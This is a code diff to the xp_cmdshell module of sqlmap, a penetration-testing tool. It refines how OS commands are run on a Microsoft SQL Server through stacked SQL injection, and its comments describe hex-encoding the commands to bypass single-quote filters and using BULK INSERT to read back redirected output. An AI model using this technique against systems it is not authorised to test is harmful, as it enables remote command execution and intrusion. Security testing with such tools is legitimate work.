@@ -105,7 +105,9 @@ class xp_cmdshell:
         logger.info("testing if xp_cmdshell extended procedure is usable")
         output = self.xpCmdshellEvalCmd("echo 1")
 
-        if isNoneValue(output):
+        if output == "1":
+            logger.info("xp_cmdshell extended procedure is usable")
+        elif isNoneValue(output):
             errMsg = "it seems that the temporary directory ('%s') used for " % self.getRemoteTempPath()
             errMsg += "storing console output within the back-end file system "
             errMsg += "does not have writing permissions for the DBMS process. "
@@ -148,15 +150,27 @@ class xp_cmdshell:
             self.xpCmdshellExecCmd(cmd)
 
     def xpCmdshellForgeCmd(self, cmd, insertIntoTable=None):
-        if conf.dCred:
+        # When user provides DBMS credentials (with --dbms-cred) we need to
+        # redirect the command standard output to a temporary file in order
+        # to retrieve it afterwards
+        # NOTE: this does not need to be done when the command is 'del' to
+        # delete the temporary file
+        if conf.dCred and insertIntoTable:
             self.tmpFile = "%s/tmpc%s.txt" % (conf.tmpPath, randomStr(lowercase=True))
             cmd = "%s > \"%s\"" % (cmd, self.tmpFile)
 
+        # Obfuscate the command to execute, also useful to bypass filters
+        # on single-quotes
         self.__randStr = randomStr(lowercase=True)
         self.__cmd = "0x%s" % hexencode(cmd)
         self.__forgedCmd = "DECLARE @%s VARCHAR(8000);" % self.__randStr
         self.__forgedCmd += "SET @%s=%s;" % (self.__randStr, self.__cmd)
 
+        # Insert the command standard output into a support table,
+        # 'sqlmapoutput', except when DBMS credentials are provided because
+        # it does not work unfortunately, BULK INSERT needs to be used to
+        # retrieve the output when OPENROWSET is used hence the redirection
+        # to a temporary file from above
         if insertIntoTable and not conf.dCred:
             self.__forgedCmd += "INSERT INTO %s " % insertIntoTable
 
@@ -185,6 +199,10 @@ class xp_cmdshell:
         else:
             inject.goStacked(self.xpCmdshellForgeCmd(cmd, self.cmdTblName))
 
+            # When user provides DBMS credentials (with --dbms-cred), the
+            # command standard output is redirected to a temporary file
+            # The file needs to be copied to the support table,
+            # 'sqlmapoutput'
             if conf.dCred:
                 inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))
                 self.delRemoteFile(self.tmpFile)
